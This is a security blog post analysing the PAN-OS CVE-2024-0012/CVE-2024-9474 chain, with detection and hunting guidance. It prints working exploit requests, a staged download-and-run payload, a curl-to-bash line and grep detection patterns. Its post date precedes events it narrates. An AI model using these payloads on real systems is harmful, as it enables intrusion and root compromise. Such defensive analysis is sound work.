@@ -1,0 +1,481 @@
+---
+layout: post
+title: "PAN-OS (CVE-2024-0012 and CVE-2024-9474)"
+subtitle: "When Your Security Appliance Becomes the Vulnerability"
+date: 2024-11-16
+header_image: /assets/images/CVE-2024-0012.png
+---
+
+There's something poetic about enterprise security appliances becoming the very thing they're supposed to protect against. When a post teasing vulnerability details in early November 2024, the security community collectively groaned, remembering CVE-2024-3400 from earlier in the year. By November 18th, when the full disclosure dropped, we had two vulnerabilities that chained together for pre-authentication remote code execution as root on devices literally designed to prevent exactly that scenario.
+
+CVE-2024-0012 and CVE-2024-9474 represent another chapter in the ongoing saga of "things that should never happen to enterprise security infrastructure but somehow keep happening anyway."
+
+## The CVEs: A Match Made in Hell
+
+**CVE-2024-0012** (CVSS 9.3) is an authentication bypass vulnerability affecting the PAN-OS management web interface. The flaw allows an unauthenticated attacker with network access to the management interface to gain administrator privileges without authentication. CWE-306: Missing Authentication for Critical Function. Classic.
+
+**CVE-2024-9474** (CVSS 6.9) is an OS command injection vulnerability that allows authenticated administrators to execute arbitrary commands with root privileges on the firewall. When you chain these together, you get pre-authentication RCE as root. Game over.
+
+Both vulnerabilities affect:
+- PA-Series firewalls
+- VM-Series firewalls
+- CN-Series firewalls
+- Panorama appliances (virtual and M-Series)
+- WildFire appliances
+
+## Timeline: From Whisper to Wildfire
+
+**November 8, 2024**: Palo Alto Networks publishes PAN-SA-2024-0015, initially as an informational advisory recommending customers secure their management interfaces. No CVE assigned yet, just vibes and vendor anxiety.
+
+**November 13, 2024**: Darktrace starts observing suspicious activity targeting Palo Alto management interfaces. Threat actors were already in the wild exploiting this before most people knew it existed.
+
+**November 14, 2024**: Palo Alto escalates the advisory severity to Critical after confirming active exploitation. The internet collectively realizes this is about to be bad.
+
+**November 18, 2024**: Full disclosure drops. CVE-2024-0012 and CVE-2024-9474 are officially published with patches. Unit 42 dubs this "Operation Lunar Peek" which honestly sounds way cooler than it should for what amounts to forgetting to check if authentication headers exist.
+
+**November 19, 2024**: watchTowr Labs publishes their technical analysis showing exactly how stupidly simple this chain is to exploit. Hours later, mass exploitation begins. Arctic Wolf, Darktrace, and others start publishing incident reports.
+
+**November 21, 2024**: CISA adds both CVEs to the Known Exploited Vulnerabilities catalog. Shadowserver reports approximately 2,000 compromised devices globally. The damage is done.
+
+## Impacted Versions and Patch Status
+
+Vulnerable versions:
+- PAN-OS 10.2: All versions prior to 10.2.12-h2
+- PAN-OS 11.0: All versions prior to 11.0.6-h1
+- PAN-OS 11.1: All versions prior to 11.1.5-h1
+- PAN-OS 11.2: All versions prior to 11.2.4-h1
+- PAN-OS 10.1: Not affected by CVE-2024-0012, but CVE-2024-9474 fixed in 10.1.14-h6
+
+Patches are available for all affected versions. If you're reading this and haven't patched yet, close this browser tab and go fix that first. We'll wait.
+
+## Proof of Concept: The Simplicity is Embarrassing
+
+The exploitation chain is remarkably straightforward, which is somehow both hilarious and terrifying given this is supposed to be enterprise-grade security infrastructure.
+
+We emulated the Metasploit exploit module in our lab environment to capture the full attack flow. What follows is the actual network traffic from a successful exploitation chain, decoded from PCAP. Watching this unfold in real-time is like watching someone politely ask a bank vault to open itself.
+
+### Phase 1: CVE-2024-0012 - Authentication? What Authentication?
+
+The PAN-OS management interface uses an `auto_prepend_file` directive in PHP configuration that runs `uiEnvSetup.php` before every PHP script. This file contains an authentication boundary check:
+
+```php
+if (
+    $_SERVER['HTTP_X_PAN_AUTHCHECK'] != 'off'
+    && $_SERVER['PHP_SELF'] !== '/CA/ocsp'
+    && $_SERVER['PHP_SELF'] !== '/php/login.php'
+    && stristr($_SERVER['REMOTE_HOST'], '127.0.0.1') === false
+) {
+    // Authentication checks happen here
+}
+```
+
+The system expects the `X-PAN-AUTHCHECK` header to be set to `off` only for specific, intentionally unauthenticated paths. Nginx is supposed to set this header to `on` by default via proxy configuration.
+
+The vulnerability exists in how Nginx handles requests to `.js.map` files. Prior to patching, the `location ~ \.js\.map$` directive in `/etc/nginx/conf/locations.conf` didn't properly set the authentication header before proxying requests.
+
+Exploitation is trivial:
+
+```http
+GET /php/ztp_gate.php/.js.map HTTP/1.1
+Host: target.example.com
+X-PAN-AUTHCHECK: off
+HTTP/1.1 200 OK
+Set-Cookie: PHPSESSID=authenticated_session_id; path=/; HttpOnly
+...
+```
+
+That's it. You literally just ask the server to turn off authentication, and it politely complies. The server looks at your `X-PAN-AUTHCHECK: off` header, nods approvingly, and hands you the keys to the kingdom. No credential bruteforce, no zero-day memory corruption, just "please disable auth" and the appliance says "sure thing, buddy."
+
+### Phase 2: CVE-2024-9474 - Command Injection via Username Field
+
+Now that we have authentication bypass, we need privilege escalation to root. Enter CVE-2024-9474.
+
+The file `/var/appweb/htdocs/php/utils/createRemoteAppwebSession.php` contains functionality that allows creating arbitrary PHP sessions with arbitrary user roles. This appears to be intended for Panorama appliances to "jump into" connected devices, but it requires zero actual authentication:
+
+```php
+$user = $_POST['user'];
+$userRole = $_POST['userRole'];
+// ... more parameters ...
+panCreateRemoteAppwebSession(
+    $user,
+    $userRole,
+    // ... more parameters
+);
+```
+
+The username from this session ends up in `$_SESSION['userName']`, which eventually gets passed unsanitized into `/var/appweb/htdocs/php-packages/panui_core/src/log/AuditLog.php`:
+
+```php
+public function write($username, $message) {
+    $s = $this->ioc->get(ShellSanitizer::class);
+    $msg = $s->escapeshellarg($message);
+    $p = $this->ioc->get(Process::class);
+    return $p->pexecute("/usr/local/bin/pan_elog -u audit -m $msg -o $username");
+    // Username is NOT sanitized before shell execution
+}
+```
+
+The `$message` parameter gets properly sanitized with `escapeshellarg()`, but `$username` gets passed directly into shell execution. Beautiful.
+
+Full exploitation chain:
+
+```http
+POST /php/utils/createRemoteAppwebSession.php/.js.map HTTP/1.1
+Host: target.example.com
+X-PAN-AUTHCHECK: off
+Content-Type: application/x-www-form-urlencoded
+
+user=`echo RCE_payload > /var/appweb/htdocs/unauth/shell.php`&userRole=superuser&remoteHost=&vsys=vsys1
+```
+
+This returns a valid PHP session ID. Then trigger the command injection:
+
+```http
+GET /index.php/.js.map HTTP/1.1
+Host: target.example.com
+Cookie: PHPSESSID=session_from_previous_request
+X-PAN-AUTHCHECK: off
+```
+
+The audit logging code executes our injected command as root. Access the payload:
+
+```http
+GET /unauth/shell.php HTTP/1.1
+Host: target.example.com
+```
+
+Game over. Pre-authentication remote code execution as root on a Next-Generation Firewall. The irony is not lost on anyone.
+
+### Real-World Exploitation: PCAP Analysis from Metasploit Module
+
+To understand exactly how this plays out in practice, we ran the Metasploit exploit module (`exploit/linux/http/panos_management_unauth_rce`) in our lab and captured the complete network traffic. The module, available since November 2024, automates the full exploitation chain we've described.
+
+What's fascinating about watching this in a packet capture is how mundane it looks. There's no exotic protocol abuse, no memory corruption wizardry, just a series of HTTP POST requests that incrementally build a payload and execute it. Let's walk through what actually happens on the wire.
+
+**Stage 1: Initial Payload Staging**
+
+The exploit begins by creating a test marker to verify command execution:
+
+```http
+POST /php/utils/createRemoteAppwebSession.php/g3e4tBEQ.js.map HTTP/1.0
+Host: backend_mgmt
+X-PAN-AUTHCHECK: off
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 103
+
+user=%60echo%20Dusr%20%3e%20/var/appweb/htdocs/unauth/Dusr%60&userRole=superuser&remoteHost=&vsys=vsys1
+```
+
+URL decoded, that's: `user=`echo Dusr > /var/appweb/htdocs/unauth/Dusr``
+
+The server politely returns a session ID:
+
+```http
+HTTP/1.1 200 OK
+Set-Cookie: PHPSESSID=m5qrdq36qongb3lh8kd1lv8nad; path=/; HttpOnly
+@start@PHPSESSID=m5qrdq36qongb3lh8kd1lv8nad@end@
+```
+
+The exploit immediately follows with a cleanup operation to remove the test marker:
+
+```http
+POST /php/utils/createRemoteAppwebSession.php/73DSO8xp.js.map HTTP/1.0
+X-PAN-AUTHCHECK: off
+user=%60rm%20-f%20/var/appweb/htdocs/unauth/Dusr%60&userRole=superuser&remoteHost=&vsys=vsys1
+```
+
+**Stage 2: Base64-Encoded Payload Construction**
+
+Here's where it gets clever. The Metasploit module can't send the entire reverse shell payload in a single request because of command length limitations and special character handling issues. Instead, it breaks the payload into base64-encoded chunks and writes them to temporary files in `/var/tmp/`. Each chunk is written sequentially:
+
+```http
+POST /php/utils/createRemoteAppwebSession.php/xoqsUgTd.js.map HTTP/1.0
+X-PAN-AUTHCHECK: off
+user=%60echo%20-n%20%27cm0gLWYgL3Zhci90bXAvZ2NibSo7IH%27%20%3e%20/var/tmp/gcbm1%60&userRole=superuser&remoteHost=&vsys=vsys1
+```
+
+Decoded: `user=`echo -n 'cm0gLWYgL3Zhci90bXAvZ2NibSo7IH' > /var/tmp/gcbm1``
+
+The base64 string `cm0gLWYgL3Zhci90bXAvZ2NibSo7IH` decodes to: `rm -f /var/tmp/gcbm*; `
+
+Each subsequent request appends another chunk:
+
+```http
+POST /php/utils/createRemoteAppwebSession.php/EQYfMGXC.js.map HTTP/1.0
+X-PAN-AUTHCHECK: off
+user=%60echo%20-n%20%27dnZXQgLXFPIC92YXIvdG1wL1pjZHpP%27%20%3e%20/var/tmp/gcbm2%60&userRole=superuser&remoteHost=&vsys=vsys1
+```
+
+This continues for multiple requests, each writing to `/var/tmp/gcbm1`, `gcbm2`, `gcbm3`, etc. The full command being assembled piece by piece is:
+
+```bash
+rm -f /var/tmp/gcbm*; 
+wget -qO /var/tmp/ZcdzOgCoS http[:]]//192.168.48.134:8080/jLIDepCa3wRaq
+PAYej1ZexTw; 
+chmod +x /var/tmp/ZcdzOgCoS; 
+/var/tmp/ZcdzOgCoS &
+```
+
+This is a classic staged payload pattern. The base64-encoded chunks when concatenated form a complete command that:
+1. Cleans up any previous exploitation artifacts
+2. Downloads a Meterpreter payload from the attacker's HTTP server
+3. Makes the payload executable
+4. Runs it in the background
+
+**Stage 3: Payload Assembly and Execution**
+
+After writing all the chunks, the exploit concatenates them:
+
+```http
+POST /php/utils/createRemoteAppwebSession.php/LR7YuXeO.js.map HTTP/1.0
+X-PAN-AUTHCHECK: off
+user=%60cat%20/var/tmp/gcbm%2a%20%3e%20/var/tmp/gcbm%60&userRole=superuser&remoteHost=&vsys=vsys1
+```
+
+Decoded: `user=`cat /var/tmp/gcbm* > /var/tmp/gcbm``
+
+This combines all the `gcbm1`, `gcbm2`, `gcbm3`, etc. files into a single file `/var/tmp/gcbm`.
+
+Finally, the exploit triggers execution by decoding and running the assembled payload:
+
+```http
+POST /php/utils/createRemoteAppwebSession.php/hmT0SS17.js.map HTTP/1.0
+X-PAN-AUTHCHECK: off
+user=%60cat%20/var/tmp/gcbm%20%7c%20base64%20-d%20%7c%20sh%60&userRole=superuser&remoteHost=&vsys=vsys1
+```
+
+Decoded: `user=`cat /var/tmp/gcbm | base64 -d | sh``
+
+This reads the base64-encoded payload, decodes it, and pipes it directly to `sh` for execution as root. At this point, the Meterpreter payload downloads, executes, and establishes an encrypted reverse shell back to the attacker's infrastructure.
+
+**What This Means for Detection**
+
+From a network perspective, this attack generates:
+- 10-12 HTTP POST requests to `createRemoteAppwebSession.php` with the `.js.map` suffix
+- All requests contain `X-PAN-AUTHCHECK: off` header
+- All requests contain base64-encoded strings or shell commands in the `user` parameter
+- A subsequent HTTP GET request from the compromised device to download the second-stage payload
+- Encrypted C2 traffic using whatever Meterpreter transport the attacker configured
+
+The base64 encoding and chunked payload approach is specifically designed to evade signature-based detection and command length restrictions. Each individual request looks relatively benign - it's only when you correlate the full sequence that the attack becomes obvious.
+
+From a host perspective, you'd see:
+- Multiple `/usr/local/bin/pan_elog` process executions with unusual arguments
+- File creation in `/var/tmp/gcbm*`
+- A `wget` or `curl` process downloading from an external IP
+- Execution of the downloaded binary
+- Network connections to unexpected external IPs
+
+This is why logging at multiple layers is critical. Network logs alone might miss the significance of individual requests. Host logs alone might not show the authentication bypass. You need both to see the complete attack chain.
+
+## Technical Deep Dive: The Anatomy of Failure
+
+### The Nginx Configuration Flaw
+
+The root cause of CVE-2024-0012 lies in Nginx's configuration handling. The patch diff from version 10.2.12-h1 to 10.2.12-h2 reveals the fix:
+
+```nginx
+# Before patch
+location ~ \.js\.map$ {
+  add_header Cache-Control "no-cache; no-store";
+  proxy_pass_header Authorization;
+  proxy_pass http://$gohost$gohostExt;
+}
+
+# After patch
+location ~ \.js\.map$ {
+  add_header Cache-Control "no-cache; no-store";
+  proxy_pass_header Authorization;
+  include conf/proxy_default.conf;  # This line added
+  proxy_pass http://$gohost$gohostExt;
+}
+
+# Additionally, headers now set globally before location blocks:
+proxy_set_header X-Real-IP "";
+proxy_set_header X-Real-Scheme "";
+proxy_set_header X-Real-Port "";
+proxy_set_header X-Real-Server-IP "";
+proxy_set_header X-Forwarded-For "";
+proxy_set_header X-pan-ndpp-mode "";
+proxy_set_header Proxy "";
+proxy_set_header X-pan-AuthCheck 'on';  # Critical security control
+```
+
+The vulnerability exists because the authentication header wasn't being set for `.js.map` requests before proxying them to the PHP backend. This created a gap where attacker-supplied headers would be honored by the backend PHP authentication checks.
+
+### The Command Injection Chain
+
+CVE-2024-9474's exploitation path requires understanding how PAN-OS handles session creation and audit logging:
+
+1. `createRemoteAppwebSession.php` accepts POST parameters and creates a PHP session with arbitrary values
+2. The username value is stored in `$_SESSION['userName']` without sanitization
+3. When admin actions are performed, audit logging is triggered
+4. The `AuditLog::write()` method retrieves the username from the session
+5. This username is interpolated directly into a shell command via `pexecute()`
+6. Shell metacharacters in the username (backticks, semicolons, pipes) execute arbitrary commands
+
+The command execution context:
+
+```bash
+# What the code tries to do:
+/usr/local/bin/pan_elog -u audit -m "sanitized_message" -o username_here
+
+# What actually happens with backtick injection:
+/usr/local/bin/pan_elog -u audit -m "sanitized_message" -o `malicious_command`
+
+# The shell evaluates the backticks first, executing malicious_command as root
+export panusername="`curl attacker.com/payload | bash`"
+```
+
+The privilege context is root because the PAN-OS management services run with elevated privileges to perform system administration tasks.
+
+### Why This Architecture Exists
+
+The `createRemoteAppwebSession.php` functionality appears designed for Panorama's multi-device management capabilities. When an administrator uses Panorama to manage a connected firewall, they need a way to "jump" into that device's management interface without re-authenticating. The design allows Panorama to create a session on the remote device, impersonating an admin with specific roles.
+
+This is an inherently dangerous design pattern. It assumes:
+- Only trusted systems (Panorama) will call this endpoint
+- Network segmentation will prevent untrusted access
+- The authentication bypass vulnerability (CVE-2024-0012) doesn't exist
+
+When CVE-2024-0012 opened the door to unauthenticated access, CVE-2024-9474 became trivially exploitable because these assumptions completely collapsed.
+
+## Forensic Considerations and Limitations
+
+Here's where things get interesting from a detection and response perspective. What do we see, and more importantly, what don't we see?
+
+### What Gets Logged (Maybe)
+
+**PAN-OS System Logs**: If you're lucky enough to have logging enabled and your appliance wasn't immediately compromised to disable it, you might find:
+
+- Authentication events showing logins from unusual source IPs
+- Admin actions performed by users with suspicious characteristics (command injection payloads in usernames)
+- Configuration changes made post-exploitation
+- System commands executed via the web interface
+
+Example log entry showing exploitation:
+
+```
+2024/11/20 08:08:18,,general,,0,0,general,informational,"User `curl 46.8.226.75/1.txt -o /var/appweb/htdocs/unauth/1.php` logged in via Panorama from Console using http over an SSL connection"
+```
+
+Notice anything weird about that username? Yeah. That's command injection sitting right there in your logs. If you see bash commands, backticks, or URL downloads in username fields, you've been owned.
+
+**Web Server Access Logs**: Nginx access logs should show requests to unusual paths with the authentication bypass pattern:
+
+```
+GET /php/utils/createRemoteAppwebSession.php/.js.map HTTP/1.1
+GET /php/ztp_gate.php/.js.map HTTP/1.1
+```
+
+The `.js.map` URI pattern is a dead giveaway for CVE-2024-0012 exploitation attempts.
+
+## Detection and Hunting
+
+Let's talk about how to find evidence of exploitation, both historical and ongoing.
+
+**URI Patterns Indicative of CVE-2024-0012**:
+
+```
+GET /php/*.php/.js.map
+POST /php/utils/createRemoteAppwebSession.php
+GET /php/ztp_gate.php/.js.map
+```
+
+Any request to PHP files with a `.js.map` suffix is highly suspicious and likely exploitation-related.
+
+**HTTP Headers**:
+
+```
+X-PAN-AUTHCHECK: off
+```
+
+This header should never appear in legitimate traffic. Its presence is a smoking gun for CVE-2024-0012 exploitation attempts.
+
+### Log-Based Hunting
+
+**PAN-OS System Logs**: Search for usernames containing shell metacharacters or suspicious patterns:
+
+```bash
+# Commands in usernames
+grep -E '\`|;|\||$\(|>\|<' /var/log/pan/authd.log
+
+# HTTP downloads in usernames
+grep -E 'curl|wget|fetch' /var/log/pan/authd.log
+
+# Backtick injection
+grep -E '\`.*\`' /var/log/pan/authd.log
+```
+
+**Suspicious Admin Actions**: Look for:
+- Configuration changes from unexpected source IPs
+- User account creation/modification
+- System command execution via web interface
+- File operations in unusual directories
+- Multiple rapid session creation events from the same source
+
+**Web Server Access Logs**: Search Nginx access logs:
+
+```bash
+# Authentication bypass attempts
+grep "\.js\.map" /var/log/pan/nginx_access.log | grep -E "(php|POST)"
+
+# Session creation abuse
+grep "createRemoteAppwebSession" /var/log/pan/nginx_access.log
+
+# Unusual paths
+grep "/unauth/" /var/log/pan/nginx_access.log | grep -v "\.css|\.js|\.png"
+
+# Base64 encoded payloads in POST data (if logging request bodies)
+grep -E "echo.*%20.*%3e%20/var/tmp" /var/log/pan/nginx_access.log
+```
+
+### File System Artifacts
+
+**Web Shells in /var/appweb/htdocs/unauth/**:
+
+```bash
+find /var/appweb/htdocs/unauth/ -type f -name "*.php" -mtime -30 -ls
+```
+
+Look for recently modified or created PHP files in paths that should only contain static assets.
+
+**Suspicious PHP Sessions**:
+
+```bash
+grep -r "userName.*\`" /opt/pancfg/mgmt/phpsessions/
+```
+
+Session files containing backticks or shell commands in the username field indicate exploitation.
+
+**Modified System Binaries**: Compare against known-good hashes:
+
+```bash
+md5sum /usr/local/bin/pan_elog
+md5sum /bin/bash
+```
+
+
+## Closing Assessment
+
+CVE-2024-0012 and CVE-2024-9474 represent a fundamental security architecture failure in enterprise infrastructure that organizations trust to protect their networks. The authentication bypass is trivial - literally asking the server to turn off authentication - and the command injection is a textbook example of trusting user-controlled data in security-critical contexts.
+
+What makes this particularly problematic is the deployment reality. These aren't web applications buried in some DMZ - they're perimeter security devices with privileged access to network routing, firewall policies, VPN configurations, and often SIEM integration. When you compromise a firewall, you don't just get access to one system - you get visibility into the entire network architecture and the ability to modify security controls that protect everything behind it.
+
+The timeline from initial disclosure to mass exploitation was measured in hours. Threat actors demonstrated they were already exploiting these vulnerabilities days before public disclosure, and the weaponization window was effectively zero once technical details became available. Organizations that didn't have their management interfaces properly secured were compromised before they could realistically patch.
+
+From a detection and response perspective, this is a nightmare scenario. Root-level access means attackers can tamper with logs, modify system files, and erase forensic evidence. Many organizations won't have comprehensive visibility into what happened because the logs they'd need to review are the same logs that attackers had full access to modify or delete.
+
+The architectural patterns that enabled these vulnerabilities - trusting headers, inadequate input validation, overly permissive session creation mechanisms - are common in enterprise infrastructure. This won't be the last time we see these patterns exploited. When your security appliance trusts user input about whether authentication should be enforced, you've already lost.
+
+For organizations running PAN-OS, the path forward is clear: patch immediately, restrict management interface access to trusted networks only, enable comprehensive logging, and if you had any internet exposure during the exploitation window, assume compromise and act accordingly. The Enhanced Factory Reset exists for a reason, and this is one of those reasons.
+
+For the rest of us, this is a reminder that "enterprise-grade" doesn't mean "secure by default" and that the devices we trust to enforce security policies are just as vulnerable as any other software when basic secure coding principles aren't followed. When you can authenticate by asking nicely and escalate privileges through command injection in a username field, the enterprise-grade label starts to look more like marketing than technical accuracy.
+
+Operation Lunar Peek is over, but the compromised devices remain. Patch your systems, lock down your management interfaces, and remember: if your security appliance's management interface is accessible from the internet, you're not running a security appliance - you're running a public exploit target with expensive licensing.
+
+## References
+[Unit 42 Threat Brief: Operation Lunar Peek](https://unit42.paloaltonetworks.com/cve-2024-0012-cve-2024-9474/)
+[watchTowr Labs Technical Analysis](https://labs.watchtowr.com/pots-and-pans-aka-an-sslvpn-palo-alto-pan-os-cve-2024-0012-and-cve-2024-9474/)
+[Arctic Wolf Incident Report](https://arcticwolf.com/resources/blog/arctic-wolf-observes-threat-campaign-targeting-palo-alto-networks-firewall-devices/)
+[Darktrace Analysis - Operation Lunar Peek](https://www.darktrace.com/blog/darktraces-view-on-operation-lunar-peek-exploitation-of-palo-alto-firewall-devices-cve-2024-2012-and-2024-9474)
